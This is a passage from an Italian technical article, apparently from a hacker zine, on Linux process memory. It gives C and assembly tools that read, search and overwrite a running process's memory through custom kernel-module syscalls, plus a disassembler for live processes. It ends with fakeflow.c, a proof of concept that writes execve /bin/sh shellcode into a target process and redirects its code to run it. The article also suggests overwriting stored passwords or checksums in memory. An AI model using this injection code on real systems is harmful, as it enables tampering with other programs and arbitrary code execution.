+if ( strcmp(argv[1], "write") == 0 )
+ {
+   pid = atoi(argv[2]);
+   printf("Insert virtual address to start writing to : ");
+   scanf("%x", &addr);
+   printf("Insert size of buffer you want to write : ");
+   scanf("%d", &size);
+   temp = (char *)malloc(size+1);
+   mcheck(temp);
+   printf("Insert buffer : ");
+   scanf("%s", temp);
+   buffer = malloc(size);
+   mcheck(buffer);
+   strncpy(buffer, temp, size);
+   ret = parse_rwvirtaddr(pid, buffer, size, addr, 1);
+
+    if ( ret == 1 )
+     {
+      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
+      exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+      exit(1);
+     }
+
+    if ( ret == -2 )
+     {
+      fprintf(stderr, "Invalid or Reserved page\n");
+      exit(1);
+     }
+
+   printf("Done\n");
+   exit(0);
+ }
+
+if ( strcmp(argv[1], "src") == 0)
+ {
+   pid = atoi(argv[2]);
+   printf("Insert virtual address to start searching from : ");
+   scanf("%x", &addr);
+   printf("Insert size of memory area you want to scan : ");
+   scanf("%d", &i);
+   printf("Insert size of buffer to search : ");
+   scanf("%d", &size);
+   temp = (char *)malloc(size+1);
+   mcheck(temp);
+   printf("Insert buffer: ");
+   scanf("%s", temp);
+   buffer = (char *)malloc(size);
+   mcheck(buffer);
+   strncpy(buffer, temp, size);
+   ret = traversemem(addr, i, buffer, size, pid);
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Buffer not found in memory area scanned\n");
+      exit(1);
+     }
+
+  printf("Found buffer at offset : %d - virtual address : %p\n", ret, addr+ret);  exit(0);
+}
+
+ usage(argv[0]);
+}
+
+
+void usage(char *name)
+ {
+   fprintf(stderr, "Usage: \n");
+   fprintf(stderr, "\t%s get pid  --  get virtual addresses from pid\n", name);
+   fprintf(stderr, "\t%s read pid --  read a part of memory (char)\n", name);
+   fprintf(stderr, "\t%s dump pid --  dump the hexcode of a part of memory\n",             name);
+   fprintf(stderr, "\t%s write pid -  write on a part of memory\n", name);
+   fprintf(stderr, "\t%s src pid  --  search a particolar memory area\n\n",                name);
+   exit(1);
+ }
+
+/*
+ * This function will scan a buffer/memory area dumped to search a particular
+ * substring, and will return the offset from the starting address
+ */
+
+int traversemem(unsigned long addr,
+                int size,
+                char *buffer,
+                int bufflen,
+                int pid)
+{
+ char *base, *found;
+ int off, ret;
+
+ base = (char *)malloc(size);
+ mcheck(base);
+ ret = parse_rwvirtaddr(pid, base, size, addr, 0);
+
+    if ( ret == 1 )
+     {
+      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
+      exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+      exit(1);
+     }
+
+    if ( ret == -2 )
+     {
+      fprintf(stderr, "Invalid or Reserved page\n");
+      exit(1);
+     }
+
+  found = (char *)memmem(base, size, buffer, bufflen);
+    if ( found == NULL )
+      return -1;
+
+  off = (unsigned long)found - (unsigned long)base;
+  return off;
+
+}
+
+/* Check of an malloc'ed memory chunck */ 
+
+void mcheck(char *maddr)
+{
+ if (maddr == NULL)
+  {
+   fprintf(stderr, "Memory allocation error - malloc()\n");
+   exit(1);
+  }
+}
+<-X->
+
+<-| lvmt/parse.s |->
+.globl parse_getvirtaddr
+.globl parse_rwvirtaddr
+
+parse_getvirtaddr:
+     pushl %ebp
+     movl %esp, %ebp
+     movl 8(%ebp), %ebx
+     movl 12(%ebp), %ecx
+     movl $224, %eax
+     int $0x80
+     popl %ebp
+     ret
+
+parse_rwvirtaddr:
+     pushl %ebp
+     movl %esp, %ebp
+     movl 8(%ebp), %ebx
+     movl 12(%ebp), %ecx
+     movl 16(%ebp), %edx
+     movl 20(%ebp), %esi
+     movl 24(%ebp), %edi
+     movl $223, %eax
+     int $0x80
+     popl %ebp
+     ret
+<-X->
+
+Il codice, che include anche dictracy.h (gia' presentata in occasione del LKM)
+non presenta particolari difficolta' e dovrebbe anche essere sufficientemente
+commentato.
+Il codice assembly di parse.s si limita a fare da ponte di collegamento tra
+memdig e le syscalls, mettendo gli argomenti delle funzioni nei registri (con
+il numero della syscall in %eax e i parametri a seguire in %ebx, %ecx, %edx,
+%esi e %edi) e passando la palla al kernel via int $0x80, del quale tutti bene
+o male avrete almeno sentito parlare (ad esempio "\xcd\x80" nei vostri
+shellcodes).
+
+Vediamo ora alcuni esempi pratici utilizzando questo semplice programmino
+(lontano dall'essere un esempio di "bel codice" :) ) per testare le varie
+funzionalita'.
+
+<-| lvmt/test.c |->
+#include <stdio.h>
+
+char temp[10] = "AAAAAAAAA\0";
+char temp2[10] = "BBBBBBBBB\0";
+main()
+{
+ char *tem;
+ tem = (char *)malloc(20);
+ strcpy(tem, "That's a test\n");
+
+/* Stampiamo l' indirizzo del buffer allocato */
+ printf("%p\n", tem);
+
+ while(1)
+ {
+  sleep(10);
+  printf("%s %s\n", temp, temp2);
+ }
+}
+<-X->
+
+Avviamo il programma in una tty:
+
+~$ ./test
+0x8049708
+AAAAAAAAA BBBBBBBBB
+AAAAAAAAA BBBBBBBBB
+[...]
+
+Carichiamo il modulo e avviamo memdig:
+
+~/lkm/mem# insmod dictracy.o
+~/lkm/mem# ./memdig
+Usage:
+        ./memdig get pid  --  get virtual addresses from pid
+        ./memdig read pid --  read a part of memory (char)
+        ./memdig dump pid --  dump the hexcode of a part of memory
+        ./memdig write pid -  write on a part of memory
+        ./memdig src pid  --  search a particolar memory area
+
+~/lkm/mem#
+
+Vedremo ora in sequenza l'utilizzo di ognuna delle opzioni.
+
+- get
+
+~/lkm/mem# ./memdig get 541 [- pid di test -]
+PID examined: 541
+RESULTS:
+        code_start:     0x8048000
+        code_end:       0x80485e4
+        data_start:     0x80495e4
+        data_end:       0x80496e8
+        heap_start:     0x8049700
+        stack_start:    0xbffffb40
+~/lkm/mem#
+
+- read
+
+~/lkm/mem# ./memdig read 541
+Insert virtual address to start reading from : 0x8049708
+Insert size of memory you want to read : 13
+PID examined: 541
+Reading at virtual address 0x8049708 13 bytes of memory
+Only valid alphanumeric chars would be printed, where not possible a "." will 
+be printed
+READ: 
+That's a test
+~/lkm/mem#
+
+In questo caso sappiamo da che indirizzo iniziare a leggere (l' abbiamo fatto
+stampare dal programma a video), il programma ci chiede anche la grandezza
+dell'area di memoria da leggere e ce la passa a video:
+
+  READ: That's a test
+
+It works like a charme :)
+
+Come scritto a video solo i caratteri alfanumerici validi (quelli compresi tra
+0x20 - lo spazio e 0x176 - la tilde) vengono stampati a video, mentre gli
+altri vengono sostituiti da un puntino.
+Inoltre al posto di un null viene stampato "\0" e al posto di un new-line
+viene stampato "\n".
+In questo modo abbiamo una sorta di strings piu' potente, in grado di farci
+vedere tutti i buffer alfanumerici (char buffer) nel data segment, nel code
+segment, nello stack o nell'heap e che non viene ingannato, ad esempio, da
+dichiarazioni come:
+
+char buffer[10];
+buffer[0] = 'T';
+buffer[1] = 'e';
+...
+buffer[9] = '\0';
+
+Vediamone un esempio:
+
+~/lkm/mem# ./memdig read 541
+Insert virtual address to start reading from : 0x80495e4
+Insert size of memory you want to read : 40
+PID examined: 541
+Reading at virtual address 0x80495e4 40 bytes of memory
+Only valid alphanumeric chars would be printed, where not possible a "." will
+be printed
+READ :
+\0\0\0\0....\0\0\0\0AAAAAAAAA\0BBBBBBBBB\0\0\0\0\0....
+
+Nel caso voleste solo una ricerca delle varie stringhe e' sufficiente la
+modifica di una printf, all' altezza del check dell'ascii value... insomma,
+questo e' solo un esempio, adattatelo alle vostre esigenze :)
+
+- dump 
+
+~/lkm/mem# ./memdig dump 541
+Insert virtual address to start reading from : 0x8048000
+Insert size of memory you want to dump : 100
+PID examined: 541
+Dumping 100 bytes of memory starting at virtual address : 0x8048000
+7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 02 00 03 00 01 00 00
+00 00 f0 83 04 08 34 00 00 00 a4 29 00 00 00 00 00 00 34 00 20 00 06
+06 00 28 00 1e 00 1b 00 06 00 00 00 34 00 00 00 34 80 04 08 34 80 04
+04 08 c0 00 00 00 c0 00 00 00 05 00 00 00 04 00 00 00 03 00 00 00 f4
+f4 00 00 00 f4 80 04 08 f4 80 04 08
+End of memory dump
+~/lkm/mem#
+
+In questo caso abbiamo scelto di dumpare i primi 100 bytes del code segment
+(dall'indirizzo ottenuto dal get sul pid), il funzionamento e' pressoche' lo
+stesso del read, tranne che l'output e' in esadecimale.
+I piu' attenti tra voi avranno sicuramente notato il tipico header di un file 
+ELF, con i magic number all'inizio (7f 45 4c 46 / 7f E L F) e i vari campi
+settati o meno.
+
+- src 
+
+Vediamo ora di trovare dove, nel data segment stia il buffer "AAAAAAAAA\0".
+
+~/lkm/mem# ./memdig src 541
+Insert virtual address to start searching from : 0x80495e4
+Insert size of memory area you want to scan : 60
+Insert size of buffer to search : 9
+Insert buffer: AAAAAAAA
+Found buffer at offset : 13 - virtual address : 0x80495f0
+~/lkm/mem#
+
+Sappiamo da dove iniziare a cercare (data segment da get sul pid), decidiamo
+di scannare 60 bytes di memoria e di cercare un buffer di 9 caratteri (bytes)
+- AAAAAAAAA.
+Il programma ci restituisce sia l' offset dall' address di partenza sia
+l'indirizzo virtuale effettivo a cui si trova.
+
+- write
+
+Vediamo di utilizzare l'indirizzo dato per effettivamente modificare il
+buffer in memoria.
+
+~/lkm/mem# ./memdig write 541
+Insert virtual address to start writing to : 0x80495f0
+Insert size of buffer you want to write : 9
+Insert buffer : CCCCCCCCC
+Done
+
+E guardiamo l'output sull'altra tty:
+
+~$ ./test
+0x8049708
+AAAAAAAAA BBBBBBBBB
+[...]
+AAAAAAAAA BBBBBBBBB
+CCCCCCCCC BBBBBBBBB
+CCCCCCCCC BBBBBBBBB
+
+In questo modo possiamo modificare non solo qualunque buffer, ma *ogni singolo
+byte* del programma in esecuzione. Gli usi possono essere diversi, pensando a
+un programma che esegua un check periodico su un buffer nel data segment, noi
+potremmo modificare questo buffer (ad esempio un md5 sum o una password) e
+variare dunque il comportamento del programma (oltre alla possibilita'
+ovviamente di inserire una nostra stringa arbitraria e andare a cercarla per
+sapere *dove* leggere in futuro, come suggeriva vecna), fino ad altre
+implementazioni pratiche, che discuteremo nella prossima sezione.
+
+
+---] Altri esempi pratici di utilizzo 
+
+--] Saled.c - Disassemblare un programma in esecuzione
+
+Sappiamo dove inizia il codesegment. Sappiamo dove finisce. Sappiamo cosa
+aspettarci da un header di un file ELF (per ogni approfondimento sugli ELF
+leggete la Specification [5]) e quindi sappiamo dove trovare l'effettivo
+entrypoint del binario in esecuzione (il campo e_entry della struct
+Elf32_Ehdr).
+
+Da queste tre basi prende origine saled: Simple And Lame Elf Disassembler.
+
+Innanzitutto vediamo il codice:
+
+<-| lvmt/saled.c |->
+/* 
+ * saled.c - Simple and Lame ELF Disassembler 
+ *                                    by twiz - twiz@email.it                   
+ * 
+ * Questo codice e' parte dell' articolo "Linux Virtual Memory Tripping" 
+ *
+ * Compile with : 
+ *   gcc -o saled -ldisasm -I./ saled.c parse.s 
+ *
+ * Assuming that you've in libdisasm.so in /usr/lib and libdis.h (and all files 
+ * included in libdis.h) in compiling directory  
+ * If not just use -I gcc tag to point to dir of libdisasm includes or modify  
+ * CPATH variable. 
+ *
+ * The official site of libdisasm is : 
+ *   http://bastard.sourceforge.net
+ *
+ * In the dictracy package there's a patched/modified version of libdisasm
+ * that, at the moment of release, isn't online yet. 
+ * Many thanks to : _mammon 
+ */       
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <linux/limits.h>
+#include <elf.h>
+#include <libdis.h>
+#include "dictracy.h"
+
+extern int parse_rwvirtaddr(int, char *, int, unsigned long, int);
+extern int parse_getvirtaddr(struct mem_addr *, int);
+void mcheck(void *maddr);
+char *elf_get_type(int type);
+char *elf_get_machine(int machine);
+
+main(int argc, char **argv)
+{
+ Elf32_Ehdr * elfhdr;
+ struct mem_addr *mem;
+ unsigned char *img;
+ int pid, ret, distance, n, size, i = 0;
+ unsigned long codeaddr, startaddr, endaddr;
+ struct instr curr_inst;
+
+if ( argc != 2 )
+ {
+  fprintf(stderr, "Usage : %s pid\n", argv[0]);
+  exit(1);
+ }
+
+pid = atoi(argv[1]);
+mem = (struct mem_addr *)malloc(sizeof(struct mem_addr));
+mcheck(mem);
+ret = parse_getvirtaddr(mem, pid);
+
+    if ( ret == 1 )
+     {
+       fprintf(stderr, "Error in triggering syscall : is the pid correct ?\n");
+       exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+       fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+       exit(1);
+     }
+
+endaddr = mem->endcode;
+codeaddr = mem->startcode;
+free(mem);
+
+img = (char *)malloc(52);
+mcheck(img);
+printf("--- PID examined: %d\n", pid);
+printf("\nELF Header - dumping at address : %p\n", codeaddr);
+ret = parse_rwvirtaddr(pid, img, 52, codeaddr, 0);
+
+    if ( ret == 1 )
+     {
+      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
+      exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+      exit(1);
+     }
+
+    if ( ret == -2 )
+     {
+      fprintf(stderr, "Invalid or Reserved page\n");
+      exit(1);
+     }
+
+ elfhdr = (void *)img;
+ if ( elfhdr->e_ident[0] != ELFMAG0 ||
+      elfhdr->e_ident[1] != ELFMAG1 ||
+      elfhdr->e_ident[2] != ELFMAG2 ||
+      elfhdr->e_ident[3] != ELFMAG3 )
+  {
+   fprintf(stderr, "Error in ELF magic\n");
+   exit(1);
+  }
+
+ printf("ELF's identification first 4 bytes 0x%2x %c %c %c\n", elfhdr->e_ident[0], elfhdr->e_ident[1], elfhdr->e_ident[2], elfhdr->e_ident[3]);
+
+ if ( elfhdr->e_ident[EI_CLASS] == 1 )
+  printf("Class : ELFCLASS32 - 32 bit objects\n");
+ if ( elfhdr->e_ident[EI_CLASS] == 2 )
+  printf("Class : ELFCLASS32 - 64 bit objects\n");
+
+ if ( elfhdr->e_ident[EI_DATA] == 1 )
+  printf("Data Encoding : Least Significant Bit\n");
+ if ( elfhdr->e_ident[EI_DATA] == 2 )
+  printf("Data Encoding : Most Significant Bit\n");
+
+ printf("Type : %d - %s\n", elfhdr->e_type, elf_get_type(elfhdr->e_type));
+ printf("Machine : %d - %s\n",elfhdr->e_machine,
+         elf_get_machine(elfhdr->e_machine));
+
+ if ( elfhdr->e_version == 1 )
+  printf("Version : EV_CURRENT\n");
+ printf("Entry : %p - virtual address to which the system first transfers control\n", elfhdr->e_entry);
+ startaddr = elfhdr->e_entry;
+ printf("PHT offset : %d\n", elfhdr->e_phoff);
+ printf("SHT offset : %d\n", elfhdr->e_shoff);
+ printf("ELF's header size : %d\n", elfhdr->e_ehsize);
+ printf("Size of one entry in PHT : %d\n", elfhdr->e_phentsize);
+ printf("Number of PHT's entry : %d\n", elfhdr->e_phnum);
+ free(img);
+
+ printf("\nStarting Debugging\n\n");
+ distance = endaddr - startaddr;
+ printf("Starting at address : %p \nEnding at address : %p\nOffset : %d\n\n",
+     startaddr, endaddr, distance);
+ img = (char *)malloc(distance);
+ ret = parse_rwvirtaddr(pid, img, distance, startaddr, 0);
+
+    if ( ret == 1 )
+     {
+      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
+      exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+      exit(1);
+     }
+
+    if ( ret == -2 )
+     {
+      fprintf(stderr, "Invalid or Reserved page\n");
+      exit(1);
+     }
+
+ disassemble_init(IGNORE_NULLS, ATT_SYNTAX);
+ while (i < distance)
+  {
+   memset(&curr_inst, 0, sizeof(struct code));
+   printf("%p   \t", startaddr + i);
+   size = disassemble_address(img + i, &curr_inst);
+     if (size)
+       {
+        for ( n = 0; n < 12; n++)
+          {
+          if ( n < size )
+             printf("%02X ", img[i + n]);
+          else
+             printf("   ");
+          }
+        printf("%s", curr_inst.mnemonic);
+          if (curr_inst.src[0] != 0)
+             printf("\t%s,", curr_inst.src);
+          if (curr_inst.aux[0] != 0)
+             printf(", %s", curr_inst.aux);
+          if (curr_inst.dest[0] != 0)
+             printf(" %s", curr_inst.dest);
+        printf("\n");
+        i += size;
+       }
+     else
+       {
+        printf("invalid opcode %02X\n", img[i]);
+        i++;
+        }
+   }
+ disassemble_cleanup();
+ exit(0);
+}
+
+
+void mcheck(void *maddr)
+{
+ if (maddr == NULL)
+  {
+   fprintf(stderr, "Memory allocation error - malloc()\n");
+   exit(1);
+  }
+}
+
+char *elf_get_type(int type)
+{
+ switch(type)
+ {
+  case 0: return "No file type";
+  case 1: return "Relocatable file";
+  case 2: return "Executable file";
+  case 3: return "Shared Object file";
+  case 4: return "Core file";
+  default:
+          if ( type >= 0xff00 && type <= 0xffff )
+            return "Processor Specific Type";
+          return "Reserved Value - Unknown";
+ }
+}
+
+char *elf_get_machine(int machine)
+{
+ switch(machine)
+ {
+  case 0: return "No machine";
+  case 1: return "AT&T WE 32100";
+  case 2: return "SPARC";
+  case 3: return "Intel 80386";
+  case 4: return "Motorola 68000";
+  case 5: return "Motorola 88000";
+  case 7: return "Intel 80860";
+  case 8: return "MIPS RS3000";
+  default:
+          return "Reserved Value - Unknown";
+ }
+}
+<-X->
+
+Come prima, con dictracy.h, non pasto anche parse.s poiche' e' gia' stata
+presentata in occasione di memdig.c .
+
+Per scrivere la parte di disassemble vera e propria mi sono servito delle
+libdisasm, che dovete necessariamente avere per compilare saled.
+Come scritto nell'intestazione queste sono "parte" del progetto bastard, un
+disassembler per linux e gli elf files (dategli uno sguardo a
+http://bastard.sourceforge.net).
+All' interno del package di dictracy troverete una versione modificata delle
+libdisasm (ringrazio mammon, creatore delle libdisasm, per la disponibilita'
+a accettare modifiche e la velocita' nell'implementarle nel codice
+"ufficiale") che al momento della stesura dell'articolo non e' online.
+Per un corretto funzionamento del disassembler quindi vi invito a usare
+quelle.
+Piu' precisamente le modifiche apportate con mammon al codice fixano alcuni
+"bug" quali ad esempio il segment overriding e alcune routine per analizzare e
+formattare l'output (la sprint routine per gli operandi e' stata "portata"
+dal codice di bastard a quello delle libdisasm) e altri minori cambiamenti.
+
+Il codice di saled.c in se' e' semplice (and lame :)) e si limita a dumpare
+tutto il codesegment in un buffer temporaneo, a estrarre da questo l'elf
+header, analizzarlo brevemente e, ricavato l'entry point (elfhdr->e_entry)
+iniziare il disassembling vero e proprio attraverso le routine di libdisasm
+(do per scontato che sappiate a grandi linee cosa faccia un disassembler e
+cosa sia, ad esempio, un opcode).
+
+Vediamo ora un esempio di utilizzo.
+
+In una tty lanciamo il solito "test" in esecuzione:
+
+twiz@twiz:~$ ./test
+0x8049708
+AAAAAAAAA BBBBBBBBB
+AAAAAAAAA BBBBBBBBB
+[...]
+
+In un'altra tty lanciamo saled passandogli a riga di comando il pid del
+programma in esecuzione che ci interessa analizzare:
+
+root@twiz:~/lkm/mem# ./saled 607
+
+--- PID examined: 607
+
+ELF Header - dumping at address : 0x8048000
+ELF's identification first 4 bytes 0x7f E L F
+Class : ELFCLASS32 - 32 bit objects
+Data Encoding : Least Significant Bit
+Type : 2 - Executable file
+Machine : 3 - Intel 80386
+Version : EV_CURRENT
+Entry : 0x80483f0 - virtual address to which the system first transfers control
+PHT offset : 52
+SHT offset : 10660
+ELF's header size : 52
+Size of one entry in PHT : 32
+Number of PHT's entry : 6
+
+Starting Debugging
+
+Starting at address : 0x80483f0
+Ending at address : 0x80485e4
+Offset : 500
+
+0x8048350       31 ED                               xor %ebp, %ebp
+0x8048352       5E                                  pop %esi
+0x8048353       89 E1                               mov %esp, %ecx
+0x8048355       83 E4 F0                            and $0xF0, %esp
+0x8048358       50                                  push %eax
+0x8048359       54                                  push %esp
+
+[...] - Segue l'intero debugging   
+
+Il programma stampa su stdout, quindi e' sufficiente una semplice redirezione
+(./saled pid > test) per avere tutto il debug su un file e per poterlo cosi'
+analizzare con calma.
+
+Le utilita' di saled sono quelle classiche di un debugger, sebbene il codice,
+volutamente molto semplice (un po' per pigrizia, un po' perche' un debugger
+completo, essendo molto lungo, avrebbe allungato troppo i tempi, esulando
+dagli effettivi obiettivi di questo articolo), non abbia tutte le feature di
+un buon debugger... l' obiettivo, al momento della stesura del codice, era di
+avere qualcosa di comodo per analizzare il code segment dell'ELF.
+Se qualcuno fosse interessato a sviluppare oltre il debugger me lo faccia
+sapere, sono, tempo permettendo, a piena disposizione :)
+
+---] Modificare il flow di un programma in esecuzione - fakeflow.c
+
+Il passo successivo a saled.c (e, ovviamente, anche se non lo ammettero' mai,
+il *vero* motivo per cui e' stato scritto saled.c :P) era cercare di
+modificare il flow di un programma in esecuzione per fargli eseguire codice
+arbitrario a nostra scelta.
+
+Prendiamo, per l'occasione, questo semplice programmino di test, stretto
+parente di quello che abbiamo usato prima:
+
+<- lvmt/test2.c |->
+#include <stdio.h>
+
+char temp[10] = "AAAAAAAAA\0";
+char temp2[10] = "BBBBBBBBB\0";
+
+main()
+{
+ int i = 0;
+
+ while(1)
+ {
+  sleep(10);
+  i = i + 5;
+  printf("%d\n", i);
+ }
+}
+<-X->
+
+E lanciamolo in esecuzione:
+
+twiz@twiz:~$ ./test
+5
+10
+15
+[...]
+
+Ora, da un'altra tty lanciamo saled per ottenere il debug del code.
+
+root@twiz:~/lkm/mem# ./saled 687 > test
+root@twiz:~/lkm/mem#
+
+Apriamo test e cerchiamo il punto che ci interessa modificare, ovvero il
+corrispettivo in asm dell'istruzione in C "i = i + 5" e proviamo a
+modificarlo, facendo per esempio aggiungere un altro numero invece che 5
+(modifica molto semplice).
+Nel codice disassemblato troviamo ad un certo punto:
+
+0x804844e       83 C4 10                            add $0x10, %esp
+0x8048451       83 45 FC 05                         add $0x5, -04(%ebp)
+0x8048455       83 C4 F8                            add $-0x8, %esp
+
+Tombola! Quello che sta scritto all'indirizzo 0x8048451 e' proprio quello che
+stavamo cercando, ovvero il punto del programma in cui viene aggiunto (add) 5
+alla variabile "i".
+Proviamo a modificarlo, facendo aggiungere ad esempio 50 invece che 5, cioe'
+sostituendo al byte all'indirizzo 0x8048454 (05) 32 (cioe' 50 in hex, cioe'
+il codice ascii corrispondente al 2).
+Per far questo ci e' sufficiente utilizzare memdig, in quanto la modifica e'
+molto semplice:
+
+root@twiz:~/lkm/mem# ./memdig write 687
+Insert virtual address to start writing to : 0x8048454
+Insert size of buffer you want to write : 1
+Insert buffer : 2
+Done
+root@twiz:~/lkm/mem#
+
+Vediamo nell'altra tty:
+
+twiz@twiz:~$ ./test
+5
+10
+60
+110
+[...]
+
+Funziona come da copione :)
+Tuttavia passare via stdin i codici esadecimali corretti, per fare una
+modifica leggermente piu' sostanziosa di quella vista ora, e' quantomeno
+scomodo (per non dire ostico).
+A rendere il tutto piu' comodo ci pensa fakeflow.c .
+
+PREMESSA
+
+Il codice di fakeflow.c e' un proof of concept per dimostrare come sia
+possibile modificare il flow di un programma. Non e' interattivo (dovete
+modificare il codice a mano, sia per correggere gli indirizzi e adattarli alla
+vostra macchina, sia per, eventualmente, modificare le istruzioni da
+eseguire), ne' si occupa di fare da qualche parte un backup della parte di
+code segment modificata (per rimettere le cose a posto successivamente).
+Come al solito, se volete sviluppare qualcosa partendo da queste idee,
+fatemelo sapere :)
+
+FINE PREMESSA   
+
+<-| lvmt/fakeflow.c |->
+/*
+ *  Fakeflow.c  - Change flow of a running program
+ *                coded by twiz - twiz@email.it
+ *
+ *  Questo codice e' parte dell' articolo "Linux Virtual Memory Tripping"
+ *
+ *  Compile with :
+ *   gcc -o fakeflow fakeflow.c parse.s
+ *
+ *  Thanks : optyx
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+extern int parse_rwvirtaddr(int, char *, int, unsigned long, int);
+void mcheck(char *maddr);
+
+main(int argc, char **argv)
+{
+ int pid, ret;
+ unsigned long addr;
+
+/* The address where we store the shellcode */
+
+ unsigned long addr2 = 0x80494de;
+
+/* We need to jump where the code we want to execute is stored :
+ *  \x68\xde\x94\x04\x08  -  pushl 0x80494de
+ *  \xc3                  -  ret
+ *
+ * We' re using 0x80494de because, on the program tested, the data segment
+ * started at address 0x80494d4. We could easily automatize that inside code
+ * (for example using getvirtaddr or passing it from stdin), but that's just
+ * a proof of concept... do it by yourself, i'm too lazy :)
+ */
+
+char jmpbuff[] = "\x68\xde\x94\x04\x08\xc3";
+
+/* Just old Aleph's shellcode */
+
+char code2exec[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
+"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40"
+"\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";
+
+
+ if ( argc != 2 )
+  {
+   fprintf(stderr, "Usage : %s pid\n", argv[0]);
+   exit(1);
+  }
+
+   pid = atoi(argv[1]);
+   printf("Insert virtual address to start writing arbitrary jump : ");
+   scanf("%x", &addr);
+   ret = parse_rwvirtaddr(pid, jmpbuff, strlen(jmpbuff), addr, 1);
+
+    if ( ret == 1 )
+     {
+      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
+      exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+      exit(1);
+     }
+
+    if ( ret == -2 )
+     {
+      fprintf(stderr, "Invalid or Reserved page\n");
+      exit(1);
+     }
+
+   printf("Using arbitrary address %p (in data segment) to store the shellcode that will be executed\n", addr2);
+   printf("Writing shellcode...");
+   fflush(stdout);
+   ret = parse_rwvirtaddr(pid, code2exec, strlen(code2exec)+1, addr2, 1);
+
+    if ( ret == 1 )
+     {
+      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
+      exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+      exit(1);
+     }
+
+    if ( ret == -2 )
+     {
+      fprintf(stderr, "Invalid or Reserved page\n");
+      exit(1);
+     }
+
+   printf("Done\n");
+   exit(0);
+ }
+
+
+void mcheck(char *maddr)
+{
+ if (maddr == NULL)
+  {
+   fprintf(stderr, "Memory allocation error - malloc()\n");
+   exit(1);
+  }
+}
+<-X->
+
+Vediamolo all'opera.
+Per l'occasione useremo nuovamente test2.c:
+
+twiz@twiz:~$ ./test
+5
+10
+15
+[...]
+
+Apriamo la solita altra tty e lanciamo fakeflow:
+
+root@twiz:~/lkm/mem# ./fakeflow 245
+Insert virtual address to start writing arbitrary jump : 0x8048451
+Using arbitrary address 0x80494de (in data segment) to store the shellcode that
+will be executed
+Writing shellcode...Done
+root@twiz:~/lkm/mem#
+  
+Il programma ci chiede a che indirizzo vogliamo scrivere i 6 bytes che ci
+permetteranno di "saltare" ovunque (in questo caso nel data segment) per
+eseguire il nostro codice.
+L'indirizzo da passare al programma lo sappiamo... infatti, come visto prima,
+possiamo tranquillamente ottenere tutto il debug del codesegment con saled.c.
+
+A questo punto non ci resta che attendere la successiva iterazione del ciclo
+while:
+
+twiz@twiz:~$ ./test
+5
+10
+15
+20
+25
+sh-2.05$
+
+Voila! Come previsto il codice eseguito e' quello della nostra shell :)
+
+POSTMESSA 
+
+Purtroppo nella realta' le cose si complicano un po' :P
+Innanzitutto, il programma che siamo andati a modificare e' molto semplice, ha
+un comportamento lineare (un ciclo while infinito, con uno sleep all'inizio
+abbastanza lungo) e predicibile e ci da' *molto* tempo (sleep(10)) per
+intervenire sul code-segment.
+Proprio perche' sappiamo che per un certo lasso di tempo l'eip puntera' 
+altrove rispetto a dove noi stiamo modificando, possiamo permetterci di andare
+a sovrascrivere anche un po' oltre l'effettiva istruzione modificata:
+
+0x804844e       83 C4 10                            add $0x10, %esp
+0x8048451       83 45 FC 05                         add $0x5, -04(%ebp)
+0x8048455       83 C4 F8                            add $-0x8, %esp
+
+La nostra modifica e' di 6 bytes, mentre l'istruzione asm che corrisponde al
+nostro "i = i + 5" e' di 4 bytes, modificheremo dunque anche "\x83\xc4",
+sovrascrivendoli, e rendendo, di fatto, il programma "incomprensibile" da quel
+punto in poi!
+
+C'e' da dire, inoltre, che un debug di un normale programma in esecuzione e'
+generalmente molto lungo (e criptico :)) e non e' sempre cosi' immediato (o
+non siamo sempre cosi' fortunati da avere una "stringa" da ricercare: 0x5 in
+questo caso) trovare dove andare a modificare e avere modo di farlo
+comodamente.
+Ovviamente l'esecuzione dello shellcode non e' l' unica cosa fattibile, e'
+possibile saltare un po' ovunque all'interno del codesegment.
+Il vantaggio in questo caso e' che abbiamo bisogno di meno bytes (un short
+jmp prende la forma di \xeb\x00, dove \x00 e' l'offset che ci interessa) ed
+e' piu' difficile incorrere in un Segmentation Fault e/o Invalid Operation.
+Per avere un esempio del funzionamento del jump, guardate lo shellcode che
+usiamo all'interno di fakeflow.c, i primi 3 bytes sono "\xeb\x1f\x5e", ovvero:
+
+     "\xeb\x1f" - jmp +1f (1f == 31)
+     "\x53"     - popl %esi (cioe' l'istruzione "successiva", ovviamente non
+                             nel program flow, visto che il jmp manda in un
+                             altro punto del codesegment, 31 bytes dopo)
+
+Un'ultima cosa, della quale, come scritto nella PREMESSA, non ci curiamo
+affatto in fakeflow.c e' il ripristino degli opcodes "originari".
+Le modifiche in data-segment sono volatili, infatti se modifichiamo una
+variabile, stoppiamo il programma e lo riavviamo il valore di questa sara'
+quello originario e non quello che abbiamo sovrascritto noi.
+Lo stesso discorso non vale nel code segment, qui, modificando la process
+image, modifichiamo il programma stesso. Provate a riavviare test2 dopo
+l'ultima modifica:
+
+twiz@twiz:~$ ./test
+Segmentation fault
+twiz@twiz:~$
+    
+Segmentation fault. Perche'?
